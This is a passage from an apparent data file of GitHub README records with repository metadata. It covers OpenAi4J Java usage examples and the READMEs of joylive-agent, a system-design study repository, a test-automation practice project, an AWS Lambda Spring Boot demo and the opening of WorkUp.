                    .parametersDefinitionByClass(ToolUtil.Weather.class)
                    .executor( w -> {
                        switch (w.location) {
                            case ""tokyo"":
                                return new ToolUtil.WeatherResponse(w.location, w.unit, 10, ""cloudy"");
                            case ""san francisco"":
                                return new ToolUtil.WeatherResponse(w.location, w.unit, 72, ""sunny"");
                            case ""paris"":
                                return new ToolUtil.WeatherResponse(w.location, w.unit, 22, ""sunny"");
                            default:
                                return new ToolUtil.WeatherResponse(w.location, w.unit, 0, ""unknown"");
                        }
                    }).build(),
            //2. city query
            FunctionDefinition.<ToolUtil.City>builder().name(""getCities"").description(""Get a list of cities by time"").parametersDefinitionByClass(ToolUtil.City.class).executor(v -> Arrays.asList(""tokyo"", ""paris"")).build()
    );
    final FunctionExecutorManager toolExecutor = new FunctionExecutorManager(functions);

    List<ChatTool> tools = new ArrayList<>();
    tools.add(new ChatTool(functions.get(0)));
    tools.add(new ChatTool(functions.get(1)));

    final List<ChatMessage> messages = new ArrayList<>();
    final ChatMessage systemMessage = new SystemMessage(""You are a helpful assistant."");
    final ChatMessage userMessage = new UserMessage(""What is the weather like in cities with weather on 2022-12-01 ?"");
    messages.add(systemMessage);
    messages.add(userMessage);

    ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest
            .builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .tools(tools)
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(200)
            .build();

    AssistantMessage accumulatedMessage = service.mapStreamToAccumulator(service.streamChatCompletion(chatCompletionRequest))
            .blockingLast()
            .getAccumulatedMessage();

    List<ChatToolCall> toolCalls = accumulatedMessage.getToolCalls();

    ChatToolCall toolCall = toolCalls.get(0);
    ChatFunctionCall function = toolCall.getFunction();
    JsonNode jsonNode = toolExecutor.executeAndConvertToJson(function.getName(), function.getArguments());
    ToolMessage toolMessage = toolExecutor.executeAndConvertToChatMessage(function.getName(),function.getArguments(), toolCall.getId());
    messages.add(accumulatedMessage);
    messages.add(toolMessage);
    ChatCompletionRequest chatCompletionRequest2 = ChatCompletionRequest
            .builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .tools(tools)
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(100)
            .logitBias(new HashMap<>())
            .build();

    // ChatCompletionChoice choice2 = service.createChatCompletion(chatCompletionRequest2).getChoices().get(0);
    AssistantMessage accumulatedMessage2 = service.mapStreamToAccumulator(service.streamChatCompletion(chatCompletionRequest2))
            .blockingLast()
            .getAccumulatedMessage();
    messages.add(accumulatedMessage2);
    for (ChatToolCall weatherToolCall : accumulatedMessage2.getToolCalls()) {
        ChatFunctionCall call2 = weatherToolCall.getFunction();
        Object itemResult = toolExecutor.execute(call2.getName(), call2.getArguments());
        messages.add(toolExecutor.executeAndConvertToChatMessage(call2.getName(),call2.getArguments(), weatherToolCall.getId()));
    }

    ChatCompletionRequest chatCompletionRequest3 = ChatCompletionRequest
            .builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .tools(tools)
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(100)
            .logitBias(new HashMap<>())
            .build();

    AssistantMessage accumulatedMessage3 = service.mapStreamToAccumulator(service.streamChatCompletion(chatCompletionRequest3))
            .blockingLast()
            .getAccumulatedMessage();
}

```

</details>
<details>
<summary>Token usage calculate</summary>

```java
public static void main(String... args) {
  List<ChatMessage> messages = new ArrayList<>();
  messages.add(new SystemMessage(""Hello OpenAI 1.""));
  messages.add(new SystemMessage(""Hello OpenAI 2.   ""));
  messages.add(new UserMessage(Arrays.asList(new ImageContent(""text"", """", new ImageUrl(""dddd"")))));
  int tokens_1 = TikTokensUtil.tokens(TikTokensUtil.ModelEnum.GPT_3_5_TURBO.getName(), messages);
  int tokens_2 = TikTokensUtil.tokens(TikTokensUtil.ModelEnum.GPT_3_5_TURBO.getName(), ""Hello OpenAI 1."");
  int tokens_3 = TikTokensUtil.tokens(TikTokensUtil.ModelEnum.GPT_4_TURBO.getName(), messages);
}
```

</details>

<details>
<summary>Assistant Tool Call</summary>

```java
static void assistantToolCall() {
    OpenAiService service = new OpenAiService();
    FunctionExecutorManager executor = new FunctionExecutorManager(Collections.singletonList(ToolUtil.weatherFunction()));
    AssistantRequest assistantRequest = AssistantRequest.builder()
            .model(""gpt-4o-mini"").name(""weather assistant"")
            .instructions(""You are a weather assistant responsible for calling the weather API to return weather information based on the location entered by the user"")
            .tools(Collections.singletonList(new FunctionTool(ToolUtil.weatherFunction())))
            .temperature(0D)
            .build();
    Assistant assistant = service.createAssistant(assistantRequest);
    String assistantId = assistant.getId();
    ThreadRequest threadRequest = ThreadRequest.builder().build();
    Thread thread = service.createThread(threadRequest);
    String threadId = thread.getId();

    MessageRequest messageRequest = MessageRequest.builder()
            .content(""What's the weather of Xiamen?"")
            .build();
    //add message to thread
    service.createMessage(threadId, messageRequest);
    RunCreateRequest runCreateRequest = RunCreateRequest.builder().assistantId(assistantId).build();

    Run run = service.createRun(threadId, runCreateRequest);

    Run retrievedRun = service.retrieveRun(threadId, run.getId());
    while (!(retrievedRun.getStatus().equals(""completed""))
            && !(retrievedRun.getStatus().equals(""failed""))
            && !(retrievedRun.getStatus().equals(""expired""))
            && !(retrievedRun.getStatus().equals(""incomplete""))
            && !(retrievedRun.getStatus().equals(""requires_action""))) {
        retrievedRun = service.retrieveRun(threadId, run.getId());
    }
    System.out.println(retrievedRun);

    RequiredAction requiredAction = retrievedRun.getRequiredAction();
    List<ToolCall> toolCalls = requiredAction.getSubmitToolOutputs().getToolCalls();
    ToolCall toolCall = toolCalls.get(0);
    ToolCallFunction function = toolCall.getFunction();
    String toolCallId = toolCall.getId();

    SubmitToolOutputsRequest submitToolOutputsRequest = SubmitToolOutputsRequest.ofSingletonToolOutput(toolCallId, executor.executeAndConvertToJson(function.getName(),function.getArguments()).toPrettyString());
    retrievedRun = service.submitToolOutputs(threadId, retrievedRun.getId(), submitToolOutputsRequest);

    while (!(retrievedRun.getStatus().equals(""completed""))
            && !(retrievedRun.getStatus().equals(""failed""))
            && !(retrievedRun.getStatus().equals(""expired""))
            && !(retrievedRun.getStatus().equals(""incomplete""))
            && !(retrievedRun.getStatus().equals(""requires_action""))) {
        retrievedRun = service.retrieveRun(threadId, run.getId());
    }

    System.out.println(retrievedRun);

    OpenAiResponse<Message> response = service.listMessages(threadId, MessageListSearchParameters.builder()
            .runId(retrievedRun.getId()).build());
    List<Message> messages = response.getData();
    messages.forEach(message -> {
        System.out.println(message.getContent());
    });

}
```

</details>

<details>
<summary>Assistant Stream </summary>

```java
static void assistantStream() throws JsonProcessingException {
  OpenAiService service = new OpenAiService();
  String assistantId;
  String threadId;

  AssistantRequest assistantRequest = AssistantRequest.builder()
          .model(""gpt-4o-mini"").name(""weather assistant"")
          .instructions(""You are a weather assistant responsible for calling the weather API to return weather information based on the location entered by the user"")
          .tools(Collections.singletonList(new FunctionTool(ToolUtil.weatherFunction())))
          .temperature(0D)
          .build();
  Assistant assistant = service.createAssistant(assistantRequest);
  assistantId = assistant.getId();

    //general response
  Flowable<AssistantSSE> threadAndRunStream = service.createThreadAndRunStream(
          CreateThreadAndRunRequest.builder()
                  .assistantId(assistantId)
                  //no tools are used here
                  .toolChoice(ToolChoice.NONE)
                  .thread(ThreadRequest.builder()
                          .messages(Collections.singletonList(
                                  MessageRequest.builder()
                                          .content(""hello what can you help me with?"")
                                          .build()
                          ))
                          .build())
                  .build()
  );

  ObjectMapper objectMapper = new ObjectMapper();
  TestSubscriber<AssistantSSE> subscriber1 = new TestSubscriber<>();
  threadAndRunStream
          .doOnNext(System.out::println)
          .blockingSubscribe(subscriber1);

  Optional<AssistantSSE> runStepCompletion = subscriber1.values().stream().filter(item -> item.getEvent().equals(StreamEvent.THREAD_RUN_STEP_COMPLETED)).findFirst();
  RunStep runStep = objectMapper.readValue(runStepCompletion.get().getData(), RunStep.class);
  System.out.println(runStep.getStepDetails());

    // Function call stream
  threadId = runStep.getThreadId();
  service.createMessage(threadId, MessageRequest.builder().content(""Please help me check the weather in Beijing"").build());
  Flowable<AssistantSSE> getWeatherFlowable = service.createRunStream(threadId, RunCreateRequest.builder()
          //Force the use of the get weather function here
          .assistantId(assistantId)
          .toolChoice(new ToolChoice(new Function(""get_weather"")))
          .build()
  );

  TestSubscriber<AssistantSSE> subscriber2 = new TestSubscriber<>();
  getWeatherFlowable
          .doOnNext(System.out::println)
          .blockingSubscribe(subscriber2);

  AssistantSSE requireActionSse = subscriber2.values().get(subscriber2.values().size() - 2);
  Run requireActionRun = objectMapper.readValue(requireActionSse.getData(), Run.class);
  RequiredAction requiredAction = requireActionRun.getRequiredAction();
  List<ToolCall> toolCalls = requiredAction.getSubmitToolOutputs().getToolCalls();
  ToolCall toolCall = toolCalls.get(0);
  String callId = toolCall.getId();

  System.out.println(toolCall.getFunction());
    // Submit function call results
    Flowable<AssistantSSE> toolCallResponseFlowable = service.submitToolOutputsStream(threadId, requireActionRun.getId(), SubmitToolOutputsRequest.ofSingletonToolOutput(callId, ""The weather in Beijing is sunny""));
  TestSubscriber<AssistantSSE> subscriber3 = new TestSubscriber<>();
  toolCallResponseFlowable
          .doOnNext(System.out::println)
          .blockingSubscribe(subscriber3);

  Optional<AssistantSSE> msgSse = subscriber3.values().stream().filter(item -> StreamEvent.THREAD_MESSAGE_COMPLETED.equals(item.getEvent())).findFirst();
  Message message = objectMapper.readValue(msgSse.get().getData(), Message.class);
  String responseContent = message.getContent().get(0).getText().getValue();
  System.out.println(responseContent);
}
```

</details>


<details>
<summary>Assistant Stream Manager</summary>

By using the `AssistantEventHandler` class and the `AssistantStreamManager` class, it is easier to manage the streaming
calls of Assistant `AssistantEventHandler` contains all Assistant stream event callback hooks, and you can implement
different events as needed:

```java
    /**
     * You can implement various event callbacks for Assistant Event Handlers according to your own needs, making it convenient for you to handle various events related to Assistant
     */
    private static class LogHandler implements AssistantEventHandler {
        @Override
        public void onEvent(AssistantSSE sse) {
            //every event will call this method
        }

        @Override
        public void onRunCreated(Run run) {
            System.out.println(""start run: "" + run.getId());
        }

        @Override
        public void onEnd() {
            System.out.println(""stream end"");
        }

        @Override
        public void onMessageDelta(MessageDelta messageDelta) {
            System.out.println(messageDelta.getDelta().getContent().get(0).getText());
        }

        @Override
        public void onMessageCompleted(Message message) {
            System.out.println(""message completed"");
        }

        @Override
        public void onMessageInComplete(Message message) {
            System.out.println(""message in complete"");
        }

        @Override
        public void onError(Throwable error) {
            System.out.println(""error:"" + error.getMessage());
        }
    }
```

`AssistantStreamManager` arranges and manages various events in the stream, supporting synchronous/asynchronous
retrieval of content from the stream,
which can be obtained through the manager. Below is a usage example, for more examples, please refer
to `AssistantStreamManagerTest.java`.

```java
    static void streamTest() {
    OpenAiService service = new OpenAiService();
    //1. create assistant
    AssistantRequest assistantRequest = AssistantRequest.builder()
            .model(""gpt-4o-mini"").name(""weather assistant"")
            .instructions(""You are a weather assistant responsible for calling the weather API to return weather information based on the location entered by the user"")
            .tools(Collections.singletonList(new FunctionTool(ToolUtil.weatherFunction())))
            .temperature(0D)
            .build();
    Assistant assistant = service.createAssistant(assistantRequest);
    String assistantId = assistant.getId();

    System.out.println(""assistantId:"" + assistantId);
    ThreadRequest threadRequest = ThreadRequest.builder()
            .build();
    Thread thread = service.createThread(threadRequest);
    String threadId = thread.getId();
    System.out.println(""threadId:"" + threadId);
    MessageRequest messageRequest = MessageRequest.builder()
            .content(""What can you help me with?"")
            .build();
    service.createMessage(threadId, messageRequest);
    RunCreateRequest runCreateRequest = RunCreateRequest.builder()
            .assistantId(assistantId)
            .toolChoice(ToolChoice.AUTO)
            .build();

    //blocking
    // AssistantStreamManager blockedManagere = AssistantStreamManager.syncStart(service.createRunStream(threadId, runCreateRequest), new LogHandler());
    //async
    AssistantStreamManager streamManager = AssistantStreamManager.start(service.createRunStream(threadId, runCreateRequest), new LogHandler());


    //Other operations can be performed here...
    boolean completed = streamManager.isCompleted();


    // you can shut down the streamManager if you want to stop the stream
    streamManager.shutDown();

    //waiting for completion
    streamManager.waitForCompletion();
    // all of flowable events
    List<AssistantSSE> eventMsgsHolder = streamManager.getEventMsgsHolder();

    Optional<Run> currentRun = streamManager.getCurrentRun();
    // get the accumulated message
    streamManager.getAccumulatedMsg().ifPresent(msg -> {
        System.out.println(""accumulatedMsg:"" + msg);
    });
    service.deleteAssistant(assistantId);
    service.deleteThread(threadId);
}
```

</details>

- [Assistant iamge chat](./service/src/test/java/com/theokanning/openai/service/assistants/AssistantImageTest.java#L65-L90)

# FAQs

<details style=""border: 1px solid #aaa; border-radius: 4px; padding: 0.5em;"">
<summary style=""font-weight: bold; color: #333;"">Is it possible to customize the OpenAI URL or use a proxy URL?</summary>
<p style=""padding: 0.5em; margin: 0; color: #555;"">Yes, you can specify a URL when constructing OpenAiService, which will serve as the base URL.But we recommend using the
environment variable OPENAI_API_BASE_URL and OPENAI_API_KEY to load the OpenAI API key.</p>
</details>

<details style=""border: 1px solid #aaa; border-radius: 4px; padding: 0.5em;"">
<summary style=""font-weight: bold; color: #333;"">Why am I experiencing connection timeouts?</summary>
<p style=""padding: 0.5em; margin: 0; color: #555;"">Ensure your network is stable and your OpenAI server is accessible. If you face network instability, consider increasing the timeout duration.</p>
</details>

# Contributing to OpenAi4J

We welcome contributions from the community and are always looking for ways to make our project better. If you're
interested in helping improve OpenAi4J, here are some ways you can contribute:

## Reporting Issues

Please use the GitHub Issues page to report issues. Be as specific as possible about how to reproduce the problem you
are having, and include details like your operating system, Java version, and any relevant stack traces.

## Submitting Pull Requests

1. Fork the repository and create your branch from `main`.
2. If you've added code that should be tested, add tests.
3. Ensure your code lints and adheres to the existing style guidelines.
4. Write a clear log message for your commits. One-line messages are fine for small changes, but bigger changes should
   have detailed descriptions.
5. Complete the pull request form, linking to any issues your PR addresses.

## Support Us

We hope you find this library useful! If you do, consider giving it a star on libraryâ¤ï¸â¤ï¸â¤ï¸. Your support helps us keep
the project alive and continuously improve it. Stay tuned for updates and feel free to contribute to the project or
suggest new features.
Thank you for supporting OpenAi4J!

# Contributors

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

<a href=""https://github.com/Lambdua/openai4j/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=Lambdua/openai4j"" />
</a>

# License
Released under the MIT License


",21,3,1,20.0,"['feature', 'quick', 'start', 'import', 'gradle', 'maven', 'chat', 'openai', 'model', 'just', 'use', 'pojo', 'example', 'faq', 'contribute', 'report', 'issue', 'submit', 'pull', 'request', 'support', 'u', 'contributor', 'license']","['feature', 'quick', 'start', 'import', 'gradle']",5.0,"[org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,4.0,1.0
jd-opensource/joylive-agent,main,"# joylive-agent

[![Build](https://github.com/jd-opensource/joylive-agent/actions/workflows/build.yml/badge.svg)](https://github.com/jd-opensource/joylive-agent/actions/workflows/build.yml)
![License](https://img.shields.io/github/license/jd-opensource/joylive-agent.svg)
[![Maven Central](https://img.shields.io/maven-central/v/com.jd.live/joylive-agent.svg?label=maven%20central)](https://search.maven.org/search?q=g:com.jd.live)
[![GitHub repo](https://img.shields.io/badge/GitHub-repo-blue)](https://github.com/jd-opensource/joylive-agent)
[![GitHub release](https://img.shields.io/github/release/jd-opensource/joylive-agent.svg)](https://github.com/jd-opensource/joylive-agent/releases)
[![Percentage of issues still open](http://isitmaintained.com/badge/open/jd-opensource/joylive-agent.svg)](http://isitmaintained.com/project/jd-opensource/joylive-agent ""Percentage of issues still open"")
[![Slack Status](https://img.shields.io/badge/slack-join_chat-white.svg?logo=slack&style=social)](https://joylivehq.slack.com)

<img src=""docs/image/weixin.png"" title=""The QR code is valid until 2024/7/8"" width=""150"" />

English | [ç®€ä½“ä¸­æ–‡](./README-zh.md)

## Overview

Service Governance Framework, supporting traditional microservice governance, swimlane governance, and multi-active (unit) traffic governance.
Following the traditional SDK governance model and Sidecar governance model, an exploration and implementation of the new generation Proxyless mode based on a microkernel extensible architecture, providing a high-performance, low-resource-consumption, cost-effective traffic governance framework for the enterprise Java ecosystem.

## Architecture
1. Agent for multi-live   
![pic](docs/image/architect-0.png)

2. Agent architect   
![pic](docs/image/architect-1.png)

3. Agent government theory   
![pic](docs/image/architect-2.png)

4. Agent for full chain gray release based on lane   
![pic](docs/image/architect-3.png)

5. Agent for local cell priority strategy   
![pic](docs/image/architect-4.png)

6. For more information, please refer to the [Architecture Manual](docs/architect.md).

## Related Projects

1. [joylive-injector](https://github.com/jd-opensource/joylive-injector), used for cloud-native scenario auto-injection of `joylive-agent`.

## How to use

### Requirements

Compile requirement: JDK 17+ and Maven 3.2.5+ 

Runtime requirement: JDK 8+

## Main Features

1. Supports traffic control for various models, including in-region multi-activity and cross-region multi-activity.
2. Support swimlane-based full-link gray scale, QPS and concurrent current limiting, label routing, load balancing and other microservice governance strategies;
3. Supports local cell priority and cross-cell fault-tolerance strategies.
4. Employs bytecode enhancement technology, which is non-intrusive to business code and minimally impacts business performance.
5. Adopts a microkernel architecture with strong class isolation, featuring an easy-to-use and simple extension and configuration system.

## Quick Start

View [Quick Start](./docs/quickstart.md)

## Configuration reference manual

View [Configuration Reference Manual](./docs/config.md)

## Usage Examples

View [Usage Examples](./docs/example.md)

## Q&A

View [Q&A](./docs/qa.md)

## Release History

View [Release History](./RELEASE.md)

## Roadmap

View [Roadmap](./docs/roadmap.md)
",5,14,6,25.0,"['overview', 'architecture', 'related', 'project', 'how', 'use', 'requirement', 'main', 'feature', 'quick', 'start', 'configuration', 'reference', 'manual', 'usage', 'example', 'q', 'a', 'release', 'history', 'roadmap']","['overview', 'architecture', 'related', 'project', 'how']",125.0,"[com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.codehaus.mojo:flatten-maven-plugin,org.codehaus.mojo:versions-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,94.0,31.0
sahilshelangia/system-design,main,"# System Design Repository

Welcome to the System Design Repository! This repository is a collection of resources, examples, and guides for system design, focusing on both Low-Level Design (LLD) and High-Level Design (HLD).

## Table of Contents

- [Introduction](#introduction)
- [Low-Level Design (LLD)](#low-level-design-lld)
- [High-Level Design (HLD)](#high-level-design-hld)
- [Recommended books](#recommended-books)
- [About me]()

## Introduction
This repository aims to provide resources to understand both aspects of system design i.e, LLD and HLD, along with super practical examples.

## Low-Level Design (LLD)
This repository have detailed content on the following topics.
- ### Basics
  - [ ] Class Diagram
  - [ ] SOLID Principle
- ### Design patterns
  - #### Creational
    - [ ] Factory Pattern
    - [ ] Abstract Factory
    - [ ] Singleton Pattern
    - [ ] Builder Pattern
    - [ ] Prototype Pattern
  - #### Structural
    - [ ] Decorator Pattern
    - [X] Proxy Pattern
    - [X] Composite Pattern
    - [X] Adapter Pattern
    - [ ] Facade Pattern
    - [ ] Flyweight Pattern
    - [ ] Bridge Pattern
  - #### Behavioural
    - [ ] Interpreter Pattern
    - [ ] Visitor Pattern
    - [ ] Mediator Pattern
    - [ ] Iterator Pattern
    - [ ] Command Pattern
    - [ ] Memento Pattern
    - [ ] Template Method Pattern
    - [ ] State Pattern
    - [ ] Chain of responsibility
    - [ ] Strategy Pattern
    - [ ] Observer Pattern
- ### Problems (machine coding)
  - [ ] Design tic-tac-toe game
  - [ ] Design ATM Machine
  - [ ] Design splitwise
  - [ ] Design traffic light management system
  - [ ] Design car rental system
  - [ ] Design file system
  - [ ] Design chess game
  - [ ] Design snake ladder game
  - [ ] Design concurrent Data Structure (e.g., Lock-Free Queue)
  - [ ] Design parking lot
  - [ ] Design elevator system
  - [ ] Designing a Database Connection Pool
  - [ ] Design logging system
  - [ ] Design a compiler or Interpreter
  - [ ] Design Vending machine
  - [ ] Design movie booking System (eg- Book my show)
  - [ ] Design A Browsers history
  - [ ] Design simplified version of twitter
  - [ ] Design text editor and LRU cache

## High-Level Design (HLD)
This repository have detailed content on the following topics.

### Basics
- [ ] CAP theorem
- [ ] Envelope Estimation
- [ ] Bloom filters
- [ ] Caching
- [ ] Load balancer
- [ ] Proxy & Reverse Proxy
- [ ] Replication
- [ ] Partitioning
- [ ] Consistent Hashing
- [ ] Rate limiter
- [ ] DNS
- [ ] Understand the scaling of each component
- [ ] Transaction
- [ ] Trouble with distributed system
- [ ] Consistency & Consensus
- [ ] Seven layered architecture
- [ ] JWT
- [ ] Service discovery
- [ ] Clock skewness

### Problems
- [ ] Design a distributed key-value store
- [ ] Design unique id generator
- [ ] Design url shortener
- [ ] Design notification system
- [ ] Design a social media feed platform
- [ ] Design chat application like WhatsApp
- [ ] Design a distributed messaging system
- [ ] Design twitter search
- [ ] Design web crawler
- [ ] Design music streaming system
- [ ] Design video streaming system
- [ ] Design ride-sharing system (eg- Uber)
- [ ] Design a recommendation system (eg- Netflix)
- [ ] Design ecommerce platform (eg- Amazon)
- [ ] Design distributed search engine


## Recommended books
- ### High level design
  - [System Design Interview â€“ An insider's guide](https://www.amazon.com/System-Design-Interview-insiders-Second/dp/B08CMF2CQF)
  - [Design data intensive application](https://www.oreilly.com/library/view/designing-data-intensive-applications/9781491903063/)
- ### Low level design
  - [Head first design pattern](https://www.oreilly.com/library/view/head-first-design/0596007124/)
  - [Elements of Reusable Object-Oriented Software](https://www.oreilly.com/library/view/design-patterns-elements/0201633612/)
  - [Clean Code](https://www.oreilly.com/library/view/clean-code-a/9780136083238/)

## About me
- [Linkedin](https://www.linkedin.com/in/sahil-yadav-iiitm/)
- [Youtube](https://www.youtube.com/channel/UC7vrnt2xRdx8km5ly8M4Ppg)",0,0,1,0.0,"['system', 'design', 'repository', 'table', 'content', 'introduction', 'design', 'lld', 'basic', 'design', 'pattern', 'creational', 'structural', 'behavioural', 'problem', 'machine', 'coding', 'design', 'hld', 'basic', 'problem', 'recommend', 'book', 'high', 'level', 'design', 'low', 'level', 'design', 'about']","['design', 'basic', 'problem', 'level', 'system']",1.0,[],0.0,1.0,0.0
GizaSystems/AutomationExercisePractice,master,"This is a practical software test automation project that demonstrates a real test automation project as part of the team's practice and training program.

# Project Details:
## Main Framework used:
* [SHAFT_Engine](https://github.com/ShaftHQ/SHAFT_ENGINE) <br><img height=""100"" title=""SHAFT_Engine"" src=""https://github.com/ShaftHQ/SHAFT_ENGINE/blob/main/src/main/resources/images/shaft.png"">
## Demo Website used:
* [Automation Exercise](https://automationexercise.com/test_cases) <br><img title=""Automation Exercise"" src=""https://automationexercise.com/static/images/home/logo.png"">
## Project Design:
* Page Object Model (POM) design pattern.
* Fluent design approach (method chaining) for better test cases readability.
* Implement the Test Automation Pyramid strategy by automating on two different test automation levels (Services and GUI layers) on applicable cases.
* Data Driven framework (store data on JSON files).

## Extras:
* Apply CI/CD pipeline workflows using GitHub Actions to be triggered
  * When a PR is created
  * On daily basis
  * On demand
  * On different platforms/operating systems and browsers
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/e76e1a73-54fb-4481-8ebb-a531cb64fa7e)
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/d930a064-2c50-471f-b2fe-4fd31ac4c791)
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/eebbb070-b2c1-4f9b-b9ae-5fc48b60f542)
* Use Github Projects to check status and progress of automting the test cases.
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/76bff439-b320-4893-bc30-fd9378e2b0cd)
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/1e68e591-ca83-4a71-b2df-20112a7e4110)
![image](https://github.com/MahmoudElSharkawyGS/AutomationExercisePractice/assets/46620469/95acc5d1-57e0-4b0b-b083-78de1e56e368)
* Apply best practices.
* Conduct code review sessions on all open and merged pull requests (PRs).

# About [Giza Systems](https://gizasystems.com/):
Giza Systems, a leading digital transformation enabler and systems integrator in the MEA region, designs and deploys industry-specific technology solutions for asset-intensive industries such as the Telecoms, Utilities, Oil & Gas, Transportation and other market sectors. Giza Systems helps its clients streamline their operations and businesses through their portfolio of solutions, managed services, and consultancy practice. Giza Systemsâ€™ team of over 2,000 professionals are spread throughout the region with anchor offices in Cairo, Riyadh, Dubai, Doha, Nairobi, Dar-es-Salaam, Abuja, Kampala,and New Jersey, allowing the Company to service an ever-increasing client base in over 40 countries.

<img title=""Giza Systems"" src=""https://gizasystems.com/img/logo.png"">
",0,0,1,67.0,"['project', 'detail', 'main', 'framework', 'use', 'demo', 'website', 'use', 'project', 'design', 'extra', 'about', 'giza', 'system', 'http']","['project', 'use', 'detail', 'main', 'framework']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
Vadym79/AWSLambdaJavaWithSpringBoot,master,"# Explore ways to run Spring Boot application with AWS Lambda Java or Customer Runtime with GraalVM Native Image  

## Architecture

<p align=""center"">
  <img src=""spring-boot-3.2-with-spring-cloud-function/src/main/resources/img/app_arch.png"" alt=""Application Architecture""/>
</p>

## Project Description
The code example include storing and retrieving product from the Amazon DynamoDB. I put Amazon API Gateway in front of my Lambdas.

I explore the following ways to run Spring Boot application with AWS Lambda Java or Customer Runtime with GraalVM Native Image:  

- Lambda with Java 21 Runtime and Spring Boot 3.2 and aws-serverless-java-container   
- Lambda with Java 21 Runtime and Spring Boot 3.2 and Spring Cloud Function   
- Lambda with Java 21 Runtime and Spring Boot 3.2 and Lambda Web Adapter   
- Lambda with Custom Runtime and Spring Boot 3.2 and GraalVM Native Image  


I made all the test for the following use cases:  

- Lambda function without SnapStart enabled  
- Lambda function with SnapStart enabled but without usage of Priming  
  -- doesn't currently work for AWS Custom Runtimes, so for GraalVM Native Image    
- Lambda function with SnapStart enabled but with usage of Priming (DynamoDB request invocation and if possible proxing the whole web request)  
  -- doesn't currently work for AWS Custom Runtimes, so for GraalVM Native Image      

# Installation and deployment

```bash

Clone git repository locally
git clone https://github.com/Vadym79/AWSLambdaJavaWithSpringBoot.git

Compile and package the Java application with Maven from the root (where pom.xml is located) of the project
mvn clean package

Deploy your application with AWS SAM
sam deploy -g  
```

In order not to use AWS Lambda SnapStart comment both lines in the globals's section of the Lambda function.

Globals:  
  Function:  
     #SnapStart:  
       #ApplyOn: PublishedVersions   

In order to user AWS Lambda SnapStart uncomment both lines above. For different Priming optimizations enabling of SnapStart is required.  
SnapStart doesn't currently work for AWS Custom Runtimes, so for GraalVM Native Image.  


## Further Readings 

My article series [""Spring Boot 3 application on AWS Lambda""](https://dev.to/aws-builders/spring-boot-3-application-on-aws-lambda-part-1-introduction-to-the-series-2m5g)

My article series [""AWS Lambda SnapStart""](https://dev.to/vkazulkin/measuring-java-11-lambda-cold-starts-with-snapstart-part-1-first-impressions-30a4)
",0,0,1,0.0,"['explore', 'way', 'run', 'spring', 'boot', 'application', 'aws', 'lambda', 'java', 'customer', 'runtime', 'graalvm', 'native', 'image', 'architecture', 'project', 'description', 'installation', 'deployment', 'further', 'reading']","['explore', 'way', 'run', 'spring', 'boot']",3.0,"[maven-assembly-plugin,maven-dependency-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.codehaus.mojo:versions-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,0.0,0.0
Ahmad45123/workup,main,"![Workup](https://i.imgur.com/kMMN6As.png)

# WorkUp: A Scalable Distributed Microservices Application

[![StandWithPalestine](https://raw.githubusercontent.com/TheBSD/StandWithPalestine/main/badges/StandWithPalestine.svg)](https://github.com/TheBSD/StandWithPalestine/blob/main/docs/README.md)

![ApacheCassandra](https://img.shields.io/badge/cassandra-%231287B1.svg?style=for-the-badge&logo=apache-cassandra&logoColor=white)
![Postgres](https://img.shields.io/badge/postgres-%23316192.svg?style=for-the-badge&logo=postgresql&logoColor=white)
![Redis](https://img.shields.io/badge/redis-%23DD0031.svg?style=for-the-badge&logo=redis&logoColor=white)
![MongoDB](https://img.shields.io/badge/MongoDB-%234ea94b.svg?style=for-the-badge&logo=mongodb&logoColor=white)
![RabbitMQ](https://img.shields.io/badge/RabbitMQ-%23FF6600.svg?style=for-the-badge&amp;logo=rabbitmq&amp;logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2CA5E0?style=for-the-badge&logo=docker&logoColor=white)
![](https://img.shields.io/badge/Junit5-25A162?style=for-the-badge&logo=junit5&logoColor=white)
![](https://img.shields.io/badge/Node%20js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)
![](https://img.shields.io/badge/Spring_Boot-F2F4F9?style=for-the-badge&logo=spring-boot)
![](https://img.shields.io/badge/Spring_Security-6DB33F?style=for-the-badge&logo=Spring-Security&logoColor=white)
